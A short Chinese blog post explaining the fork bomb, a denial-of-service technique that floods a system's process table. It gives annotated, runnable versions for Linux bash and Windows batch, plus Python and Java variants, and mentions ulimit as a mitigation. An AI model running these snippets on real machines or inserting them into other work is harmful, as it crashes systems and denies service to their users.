---
title: Fork Bomb
date: 2017-02-04 10:36:52
comments: true
tags: 
- ForkBomb
categories: 系统安全
password:
copyright: true
---
　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。

#### linux系统

##### Code
```bash
:(){ :|:& };:
```

##### 注解
:()　# 定义函数,函数名为":",即每当输入":"时就会自动调用{}内代码 
{　　# ":"函數起始字元     
:　　# 用递归方式调用":"函数本身     
|　　# 並用管線(pipe)將其輸出引至...（因为有一个管線操作字元，因此會生成一個新的進程）     
:　　# 另一次递归调用的":"函数 # 综上,":|:"表示的即是每次調用函数":"的時候就會產生兩份拷貝     
&　　# 調用間脱鉤,以使最初的":"函数被關閉後為其所調用的兩個":"函數還能繼續執行 
}　　# ":"函數終止字元 
;　　# ":"函数定义结束后将要进行的操作... 
:　　# 调用":"函数,"引爆"fork炸弹



#### Windows系统(创建一个.bat，写入以下命令运行即可)

##### Code
```bash
%0|%0|%0
```
##### 注释
%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat
|%0就是打开自身后的程序再打开.bat
3的指数倍

##### 预防
一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。


#### 编程语言应用

Using Python:

```bash
import os
while 1:
    os.fork()
```

Using Java:

```bash
public class ForkBomb
{
  public static void main(String[] args)
  {
    while(true)
    {
      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
    }
  }
}
```

官方参考链接：[https://en.wikipedia.org/wiki/Fork_bomb](https://en.wikipedia.org/wiki/Fork_bomb)

